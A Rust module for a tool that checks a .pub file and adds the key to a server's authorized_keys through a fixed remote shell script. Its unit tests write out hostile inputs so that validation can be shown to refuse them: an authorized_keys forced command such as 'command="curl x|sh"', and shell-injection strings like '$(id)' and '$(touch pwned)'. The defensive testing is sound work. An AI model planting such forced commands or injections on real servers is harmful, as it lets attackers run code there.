//! Sending a public key to a server: what may be sent, and what runs there.
//!
//! Two rules decide everything in this module:
//!
//! - **Only a public key line is sent, and it travels on stdin.** It is never part
//!   of a command line, so nothing in it can be read as a command by any shell. It
//!   is checked first: exactly one line, starting with a real key type, with no
//!   control characters. A file that is anything else (a private key, a line with
//!   `command="..."` options in front, several keys) is refused.
//! - **What runs on the server is one fixed string** ([`REMOTE_COMMAND`]). It
//!   contains no user data: not the key, not a host name, not a path. The key is
//!   read by the remote script from its stdin into a quoted variable.
//!
//! This is the one place where a shell is involved, and it is the server's: ssh
//! hands the command to the login shell there. Locally the program is started with
//! an argument vector, as everywhere else.

use std::fmt;
use std::fs;
use std::io::Read;
use std::path::Path;

use super::keys::is_plain_file_name;
use crate::sanitize::is_unsafe_char;

/// What the server runs, as one argument after the destination.
///
/// The login shell there can be anything (bash, fish, csh), so this is
/// `sh -c '...'` and the script is written to mean the same to all of them: it is
/// one line, and holds no single quote, backslash or `!`, which are the
/// characters those shells read inside quotes.
///
/// The script: goes to the home directory (and stops if there is none), makes
/// `~/.ssh` if needed with mode 0700 by way of `umask`, reads one line from stdin
/// as the key, adds it to `~/.ssh/authorized_keys` unless the same line is already
/// there (mending a missing final newline first), and lets SELinux relabel the
/// files where `restorecon` exists, as `ssh-copy-id` does. It never changes the
/// mode of anything that exists.
pub const REMOTE_COMMAND: &str = concat!(
    "sh -c '",
    "cd || exit 1; ",
    "umask 077; ",
    "mkdir -p .ssh || exit 1; ",
    "read -r key || exit 1; ",
    "[ -n \"$key\" ] || exit 1; ",
    "f=.ssh/authorized_keys; ",
    "touch \"$f\" || exit 1; ",
    "if grep -qxF -- \"$key\" \"$f\"; then :; else ",
    "if [ -s \"$f\" ] && [ -n \"$(tail -c 1 \"$f\")\" ]; then echo >> \"$f\" || exit 1; fi; ",
    "{ printf \"%s\" \"$key\"; echo; } >> \"$f\" || exit 1; ",
    "fi; ",
    "if [ -x /sbin/restorecon ]; then /sbin/restorecon .ssh \"$f\" >/dev/null 2>&1; fi; ",
    "exit 0",
    "'"
);

/// The key types that OpenSSH accepts in `authorized_keys` and that are not
/// disabled by default. A line that starts with anything else is not sent.
pub const KEY_TYPES: [&str; 7] = [
    "ssh-ed25519",
    "ssh-rsa",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ssh-ed25519@openssh.com",
    "sk-ecdsa-sha2-nistp256@openssh.com",
];

/// The most of a `.pub` file that is read. A real one is well under 1 KiB.
pub const MAX_PUBLIC_FILE: u64 = 16 * 1024;

/// The longest key line that is sent.
const MAX_LINE: usize = 8 * 1024;

/// Why a public key cannot be sent. Each says what to do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AuthorizeError {
    /// The key's file name is not a plain file name.
    BadName,
    /// The file could not be read. Holds the path and why.
    Unreadable { path: String, reason: String },
    /// The path is not a regular file.
    NotAFile { path: String },
    /// The file is larger than a public key can be.
    TooLarge,
    /// The file is not text.
    NotText,
    /// The file has no key in it.
    Empty,
    /// The file has more than one line.
    MoreThanOneLine,
    /// The line does not start with a key type. This is also what a private key,
    /// or a line with options in front of the key, looks like.
    UnknownType,
    /// After the type there is no key that looks like one.
    MalformedKey,
    /// The line has control or bidirectional characters.
    UnsafeCharacters,
}

impl fmt::Display for AuthorizeError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            AuthorizeError::BadName => f.write_str("That is not the name of a key file."),
            AuthorizeError::Unreadable { path, reason } => {
                write!(f, "Could not read the public key {path}: {reason}")
            }
            AuthorizeError::NotAFile { path } => {
                write!(f, "The public key {path} is not a regular file.")
            }
            AuthorizeError::TooLarge => f.write_str(
                "The public key file is far larger than a public key can be, so it was not sent.",
            ),
            AuthorizeError::NotText => {
                f.write_str("The public key file is not text, so it was not sent.")
            }
            AuthorizeError::Empty => f.write_str("The public key file is empty."),
            AuthorizeError::MoreThanOneLine => f.write_str(
                "The public key file has more than one line. Only a file with exactly one key \
                 is sent.",
            ),
            AuthorizeError::UnknownType => f.write_str(
                "The public key file does not start with a key type such as ssh-ed25519, so it \
                 was not sent. Is it really a public key (.pub)?",
            ),
            AuthorizeError::MalformedKey => f.write_str(
                "The public key file has a key type but no key that looks like one, so it was \
                 not sent.",
            ),
            AuthorizeError::UnsafeCharacters => {
                f.write_str("The public key file has control characters in it, so it was not sent.")
            }
        }
    }
}

impl std::error::Error for AuthorizeError {}

/// One public key, checked: a single line that starts with a real key type.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PublicKeyLine {
    line: String,
}

impl PublicKeyLine {
    /// The line, without its line break.
    pub fn as_str(&self) -> &str {
        &self.line
    }

    /// The key type, for example `ssh-ed25519`.
    pub fn key_type(&self) -> &str {
        self.line.split(' ').next().unwrap_or_default()
    }

    /// What goes on ssh's stdin: the line and its line break, nothing else.
    ///
    /// The line is checked again here, where it becomes bytes for another
    /// program, and not only when it was read.
    pub fn to_stdin(&self) -> Result<Vec<u8>, AuthorizeError> {
        validate_public_key(&self.line)?;
        let mut bytes = self.line.clone().into_bytes();
        bytes.push(b'\n');
        Ok(bytes)
    }
}

/// Checks the contents of a `.pub` file: exactly one line (its final line break
/// is allowed), `<type> <base64 key>` and then, optionally, a comment.
pub fn validate_public_key(text: &str) -> Result<PublicKeyLine, AuthorizeError> {
    let line = text.strip_suffix('\n').unwrap_or(text);
    let line = line.strip_suffix('\r').unwrap_or(line);
    if line.is_empty() {
        return Err(AuthorizeError::Empty);
    }
    if line.contains('\n') || line.contains('\r') {
        // A carriage return in the middle is a line break to some readers.
        return Err(AuthorizeError::MoreThanOneLine);
    }
    if line.chars().any(is_unsafe_char) {
        return Err(AuthorizeError::UnsafeCharacters);
    }

    let mut fields = line.splitn(3, ' ');
    let key_type = fields.next().unwrap_or_default();
    if !KEY_TYPES.contains(&key_type) {
        return Err(AuthorizeError::UnknownType);
    }
    let key = fields.next().unwrap_or_default();
    // Every OpenSSH public key blob starts with the length of its type name as a
    // 32-bit number, which is why they all start with AAAA in base64.
    let looks_like_a_key = key.starts_with("AAAA")
        && key
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'='));
    if !looks_like_a_key || line.len() > MAX_LINE || line != line.trim() {
        return Err(AuthorizeError::MalformedKey);
    }
    Ok(PublicKeyLine {
        line: line.to_string(),
    })
}

/// Reads and checks `<file_name>.pub` in `dir`.
///
/// `file_name` is the private key's name, one plain path component, so nothing
/// outside `dir` can be named. The file must be a regular file (a link to one is
/// fine) and is read only up to [`MAX_PUBLIC_FILE`] bytes.
pub fn read_public_key(dir: &Path, file_name: &str) -> Result<PublicKeyLine, AuthorizeError> {
    if !is_plain_file_name(file_name) {
        return Err(AuthorizeError::BadName);
    }
    let path = dir.join(format!("{file_name}.pub"));
    let shown = path.display().to_string();
    let unreadable = |err: std::io::Error| AuthorizeError::Unreadable {
        path: shown.clone(),
        reason: err.to_string(),
    };

    let metadata = fs::metadata(&path).map_err(unreadable)?;
    if !metadata.is_file() {
        return Err(AuthorizeError::NotAFile { path: shown });
    }
    let mut bytes = Vec::new();
    fs::File::open(&path)
        .and_then(|file| file.take(MAX_PUBLIC_FILE + 1).read_to_end(&mut bytes))
        .map_err(unreadable)?;
    if bytes.len() as u64 > MAX_PUBLIC_FILE {
        return Err(AuthorizeError::TooLarge);
    }
    let text = String::from_utf8(bytes).map_err(|_| AuthorizeError::NotText)?;
    validate_public_key(&text)
}

#[cfg(test)]
mod tests {
    use super::*;

    const BLOB: &str = "AAAAC3NzaC1lZDI1NTE5AAAAIOgZC7Rr8bQm3Kz1x2yFq4mUu0q5m0oH1n7eV1j9XxYp";

    fn line(kind: &str, comment: &str) -> String {
        if comment.is_empty() {
            format!("{kind} {BLOB}")
        } else {
            format!("{kind} {BLOB} {comment}")
        }
    }

    #[test]
    fn a_normal_public_key_is_accepted_with_or_without_a_comment_and_line_break() {
        for text in [
            line("ssh-ed25519", "me@laptop"),
            line("ssh-ed25519", ""),
            line("ssh-ed25519", "with several words (and) <brackets>"),
            format!("{}\n", line("ssh-ed25519", "me@laptop")),
            format!("{}\r\n", line("ssh-ed25519", "me@laptop")),
        ] {
            let key = validate_public_key(&text).unwrap_or_else(|err| panic!("{text:?}: {err}"));
            assert!(!key.as_str().contains(['\n', '\r']), "{text:?}");
            assert_eq!(key.key_type(), "ssh-ed25519");
        }
    }

    #[test]
    fn every_listed_type_is_accepted_and_others_are_not() {
        for kind in KEY_TYPES {
            assert!(validate_public_key(&line(kind, "c")).is_ok(), "{kind}");
        }
        for kind in [
            "ssh-dss",
            "ssh-ed25519-cert-v01@openssh.com",
            "SSH-ED25519",
            "ssh",
            "",
            "-----BEGIN",
        ] {
            assert_eq!(
                validate_public_key(&line(kind, "c")),
                Err(AuthorizeError::UnknownType),
                "{kind:?}"
            );
        }
    }

    #[test]
    fn options_in_front_of_the_key_are_never_sent() {
        // What an attacker who can write a .pub would try: the server would read
        // these as restrictions or, worse, as a forced command.
        for prefix in [
            "command=\"curl x|sh\" ",
            "from=\"*\",command=\"id\" ",
            "no-pty,permitopen=\"x:1\" ",
            "environment=\"A=b\" ",
        ] {
            let text = format!("{prefix}{}", line("ssh-ed25519", "x"));
            assert_eq!(
                validate_public_key(&text),
                Err(AuthorizeError::UnknownType),
                "{text}"
            );
        }
    }

    #[test]
    fn a_private_key_is_not_a_public_key_and_is_never_sent() {
        let private = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----\n";
        assert!(validate_public_key(private).is_err());
        assert_eq!(
            validate_public_key("-----BEGIN OPENSSH PRIVATE KEY-----"),
            Err(AuthorizeError::UnknownType)
        );
    }

    #[test]
    fn more_than_one_line_is_refused_whatever_the_second_line_is() {
        let good = line("ssh-ed25519", "a");
        for text in [
            format!("{good}\n{good}\n"),
            format!("{good}\n\n"),
            format!("{good}\nssh-rsa AAAA"),
            format!("{good}\n# comment"),
            format!("\n{good}"),
            format!("{good}\r{good}"),
            format!("{good}\r\r\n"),
        ] {
            assert_eq!(
                validate_public_key(&text),
                Err(AuthorizeError::MoreThanOneLine),
                "{text:?}"
            );
        }
    }

    #[test]
    fn control_and_bidirectional_characters_are_refused_anywhere_in_the_line() {
        for bad in [
            "tab\there",
            "esc\x1b[31m",
            "nul\0",
            "bell\x07",
            "rtl \u{202e}x",
            "iso \u{2066}x",
            "c1 \u{85}",
        ] {
            let text = line("ssh-ed25519", bad);
            assert_eq!(
                validate_public_key(&text),
                Err(AuthorizeError::UnsafeCharacters),
                "{bad:?}"
            );
        }
        assert_eq!(
            validate_public_key("ssh-ed25519\tAAAA"),
            Err(AuthorizeError::UnsafeCharacters)
        );
    }

    #[test]
    fn empty_or_keyless_lines_are_refused() {
        assert_eq!(validate_public_key(""), Err(AuthorizeError::Empty));
        assert_eq!(validate_public_key("\n"), Err(AuthorizeError::Empty));
        assert_eq!(validate_public_key("\r\n"), Err(AuthorizeError::Empty));
        for text in [
            "ssh-ed25519",
            "ssh-ed25519 ",
            "ssh-ed25519  comment",
            "ssh-ed25519 notbase64!!",
            "ssh-ed25519 BBBBC3NzaC1lZDI1NTE5",
            "ssh-ed25519 AAAA$(id)",
            "ssh-ed25519 AAAA;id",
            "ssh-ed25519 AAAA'x",
            "ssh-ed25519 AAAA\"x",
            "ssh-ed25519 AAAA`id`",
            "ssh-ed25519 AAAA\\x",
        ] {
            assert_eq!(
                validate_public_key(text),
                Err(AuthorizeError::MalformedKey),
                "{text:?}"
            );
        }
    }

    #[test]
    fn leading_or_trailing_space_and_overlong_lines_are_refused() {
        assert!(validate_public_key(&format!(" {}", line("ssh-ed25519", "a"))).is_err());
        assert_eq!(
            validate_public_key(&format!("{} ", line("ssh-ed25519", "a"))),
            Err(AuthorizeError::MalformedKey)
        );
        let long = line("ssh-ed25519", &"x".repeat(MAX_LINE));
        assert_eq!(
            validate_public_key(&long),
            Err(AuthorizeError::MalformedKey)
        );
    }

    #[test]
    fn what_goes_to_stdin_is_the_line_and_one_line_break() {
        let key = validate_public_key(&format!("{}\r\n", line("ssh-ed25519", "me"))).unwrap();
        let bytes = key.to_stdin().unwrap();
        assert_eq!(
            bytes,
            format!("{}\n", line("ssh-ed25519", "me")).into_bytes()
        );
        assert_eq!(bytes.iter().filter(|b| **b == b'\n').count(), 1);
    }

    #[test]
    fn stdin_is_checked_again_where_the_bytes_are_made() {
        // A value that skipped validation (it cannot outside this module) still
        // cannot reach ssh.
        for line in [
            "ssh-ed25519 AAAA\nssh-rsa AAAA",
            "command=\"x\" ssh-ed25519 AAAA",
            "",
        ] {
            let key = PublicKeyLine {
                line: line.to_string(),
            };
            assert!(key.to_stdin().is_err(), "{line:?}");
        }
    }

    // ---- the remote command ---------------------------------------------------

    #[test]
    fn the_remote_command_is_one_quoted_script_for_sh_and_holds_no_user_data() {
        assert!(REMOTE_COMMAND.starts_with("sh -c '"));
        assert!(REMOTE_COMMAND.ends_with('\''));
        let script = &REMOTE_COMMAND["sh -c '".len()..REMOTE_COMMAND.len() - 1];
        // The characters that the login shell, whatever it is, would read inside
        // quotes, or that would end them.
        for forbidden in ['\'', '\\', '!', '\n', '\r', '\0'] {
            assert!(
                !script.contains(forbidden),
                "{forbidden:?} in the remote script"
            );
        }
        assert!(script.is_ascii());
        assert!(script.len() < 1024);
    }

    #[test]
    fn the_remote_script_reads_the_key_from_stdin_and_never_from_the_command() {
        assert!(REMOTE_COMMAND.contains("read -r key"));
        // Always quoted where it is used.
        for use_of_key in REMOTE_COMMAND.match_indices("$key") {
            let before = &REMOTE_COMMAND[..use_of_key.0];
            assert!(before.ends_with('"'), "unquoted $key at {}", use_of_key.0);
        }
        // It changes no mode of anything that exists, removes and moves nothing.
        for word in ["chmod ", "chown ", "rm ", "mv ", "cp "] {
            assert!(!REMOTE_COMMAND.contains(word), "{word}");
        }
        // The only redirections are appending to the file, and silencing restorecon.
        let others = REMOTE_COMMAND
            .replace(">> \"$f\"", "")
            .replace(">/dev/null", "")
            .replace("2>&1", "");
        assert!(!others.contains('>'), "the file is only ever appended to");
        assert!(REMOTE_COMMAND.contains("umask 077"));
        assert!(REMOTE_COMMAND.contains("grep -qxF"), "no duplicate lines");
    }

    /// The script really does what it says, run by the local `sh` on a scratch
    /// home. This is the only test that runs it; the real servers' shells differ
    /// only in how they read the quoting, which the test above constrains.
    #[cfg(unix)]
    mod run_locally {
        use super::*;
        use std::io::Write;
        use std::os::unix::fs::PermissionsExt;
        use std::process::{Command, Stdio};

        fn run(home: &Path, stdin: &[u8]) -> std::process::ExitStatus {
            let script = &REMOTE_COMMAND["sh -c '".len()..REMOTE_COMMAND.len() - 1];
            let mut child = Command::new("sh")
                .arg("-c")
                .arg(script)
                .env("HOME", home)
                .stdin(Stdio::piped())
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn()
                .unwrap();
            let mut input = child.stdin.take().unwrap();
            let _ = input.write_all(stdin);
            drop(input);
            child.wait().unwrap()
        }

        fn authorized(home: &Path) -> String {
            fs::read_to_string(home.join(".ssh/authorized_keys")).unwrap_or_default()
        }

        fn mode(path: &Path) -> u32 {
            fs::metadata(path).unwrap().permissions().mode() & 0o7777
        }

        #[test]
        fn it_creates_the_directory_and_file_private_and_adds_the_key() {
            let home = tempfile::tempdir().unwrap();
            let key = line("ssh-ed25519", "me@laptop");
            assert!(run(home.path(), format!("{key}\n").as_bytes()).success());
            assert_eq!(authorized(home.path()), format!("{key}\n"));
            assert_eq!(mode(&home.path().join(".ssh")), 0o700);
            assert_eq!(mode(&home.path().join(".ssh/authorized_keys")), 0o600);
        }

        #[test]
        fn a_key_that_is_already_there_is_not_added_twice() {
            let home = tempfile::tempdir().unwrap();
            let key = line("ssh-ed25519", "me@laptop");
            for _ in 0..3 {
                assert!(run(home.path(), format!("{key}\n").as_bytes()).success());
            }
            assert_eq!(authorized(home.path()), format!("{key}\n"));
        }

        #[test]
        fn other_keys_are_kept_and_a_missing_final_newline_is_mended() {
            let home = tempfile::tempdir().unwrap();
            fs::create_dir(home.path().join(".ssh")).unwrap();
            let existing = line("ssh-rsa", "old");
            fs::write(home.path().join(".ssh/authorized_keys"), &existing).unwrap();
            let key = line("ssh-ed25519", "new");
            assert!(run(home.path(), format!("{key}\n").as_bytes()).success());
            assert_eq!(authorized(home.path()), format!("{existing}\n{key}\n"));
        }

        #[test]
        fn modes_that_exist_are_left_alone() {
            let home = tempfile::tempdir().unwrap();
            let ssh = home.path().join(".ssh");
            fs::create_dir(&ssh).unwrap();
            fs::set_permissions(&ssh, fs::Permissions::from_mode(0o755)).unwrap();
            fs::write(ssh.join("authorized_keys"), "").unwrap();
            fs::set_permissions(
                ssh.join("authorized_keys"),
                fs::Permissions::from_mode(0o640),
            )
            .unwrap();
            assert!(
                run(
                    home.path(),
                    format!("{}\n", line("ssh-ed25519", "a")).as_bytes()
                )
                .success()
            );
            assert_eq!(mode(&ssh), 0o755);
            assert_eq!(mode(&ssh.join("authorized_keys")), 0o640);
        }

        #[test]
        fn a_comment_with_shell_syntax_or_backslashes_is_stored_as_text() {
            let home = tempfile::tempdir().unwrap();
            let key = line(
                "ssh-ed25519",
                "$(touch pwned) `id` ; \\n \\c a\\\\b \"q\" 'q' *",
            );
            assert!(run(home.path(), format!("{key}\n").as_bytes()).success());
            assert_eq!(authorized(home.path()), format!("{key}\n"));
            assert!(!home.path().join("pwned").exists());
            assert_eq!(
                authorized(home.path()).lines().count(),
                1,
                "a backslash-n in a comment must not become a second line"
            );
        }

        #[test]
        fn no_key_on_stdin_adds_nothing_and_fails() {
            let home = tempfile::tempdir().unwrap();
            assert!(!run(home.path(), b"").success());
            assert!(!run(home.path(), b"\n").success());
            assert_eq!(authorized(home.path()), "");
        }

        #[test]
        fn a_home_that_cannot_be_used_fails_instead_of_writing_elsewhere() {
            let home = tempfile::tempdir().unwrap();
            let missing = home.path().join("nothing-here");
            let key = line("ssh-ed25519", "a");
            assert!(!run(&missing, format!("{key}\n").as_bytes()).success());
            assert!(!missing.exists());
        }
    }

    // ---- reading the file -----------------------------------------------------

    fn dir_with(name: &str, contents: &[u8]) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        fs::write(dir.path().join(name), contents).unwrap();
        dir
    }

    #[test]
    fn the_public_file_of_a_key_is_read_and_checked() {
        let key = line("ssh-ed25519", "me");
        let dir = dir_with("id.pub", format!("{key}\n").as_bytes());
        assert_eq!(read_public_key(dir.path(), "id").unwrap().as_str(), key);
    }

    #[test]
    fn a_missing_or_unsuitable_file_is_refused_with_its_path_and_reason() {
        let dir = tempfile::tempdir().unwrap();
        let err = read_public_key(dir.path(), "nothing").unwrap_err();
        let AuthorizeError::Unreadable { path, .. } = &err else {
            panic!("{err:?}");
        };
        assert!(path.ends_with("nothing.pub"), "{path}");

        fs::create_dir(dir.path().join("folder.pub")).unwrap();
        assert!(matches!(
            read_public_key(dir.path(), "folder"),
            Err(AuthorizeError::NotAFile { .. })
        ));

        let dir = dir_with("big.pub", &vec![b'a'; MAX_PUBLIC_FILE as usize + 1]);
        assert_eq!(
            read_public_key(dir.path(), "big"),
            Err(AuthorizeError::TooLarge)
        );
        let dir = dir_with("bin.pub", &[0xff, 0xfe, 0x00]);
        assert_eq!(
            read_public_key(dir.path(), "bin"),
            Err(AuthorizeError::NotText)
        );
    }

    #[test]
    fn a_name_that_could_reach_another_folder_is_refused_before_anything_is_read() {
        let dir = tempfile::tempdir().unwrap();
        for name in ["", ".", "..", "../x", "a/b", "a\\b", "x\ny"] {
            assert_eq!(
                read_public_key(dir.path(), name),
                Err(AuthorizeError::BadName),
                "{name:?}"
            );
        }
    }

    #[test]
    fn a_file_that_is_not_a_public_key_is_refused_even_if_it_is_named_pub() {
        let dir = dir_with(
            "evil.pub",
            b"command=\"sh -c 'curl x|sh'\" ssh-ed25519 AAAAC3Nz evil\n",
        );
        assert_eq!(
            read_public_key(dir.path(), "evil"),
            Err(AuthorizeError::UnknownType)
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_link_to_a_public_file_is_read_and_a_link_to_a_folder_is_not() {
        let dir = tempfile::tempdir().unwrap();
        let key = line("ssh-ed25519", "linked");
        let target = dir_with("real", format!("{key}\n").as_bytes());
        std::os::unix::fs::symlink(target.path().join("real"), dir.path().join("l.pub")).unwrap();
        assert_eq!(read_public_key(dir.path(), "l").unwrap().as_str(), key);
        std::os::unix::fs::symlink(target.path(), dir.path().join("d.pub")).unwrap();
        assert!(matches!(
            read_public_key(dir.path(), "d"),
            Err(AuthorizeError::NotAFile { .. })
        ));
    }

    #[test]
    fn every_error_says_what_to_do_in_plain_english() {
        for err in [
            AuthorizeError::BadName,
            AuthorizeError::Unreadable {
                path: "/x.pub".to_string(),
                reason: "denied".to_string(),
            },
            AuthorizeError::NotAFile {
                path: "/x.pub".to_string(),
            },
            AuthorizeError::TooLarge,
            AuthorizeError::NotText,
            AuthorizeError::Empty,
            AuthorizeError::MoreThanOneLine,
            AuthorizeError::UnknownType,
            AuthorizeError::MalformedKey,
            AuthorizeError::UnsafeCharacters,
        ] {
            let text = err.to_string();
            // The reason of an unreadable file is the system's own words.
            if !matches!(err, AuthorizeError::Unreadable { .. }) {
                assert!(text.ends_with('.') || text.ends_with('?'), "{text}");
            }
            assert!(!text.contains("Error") && !text.contains("::"), "{text}");
        }
    }
}
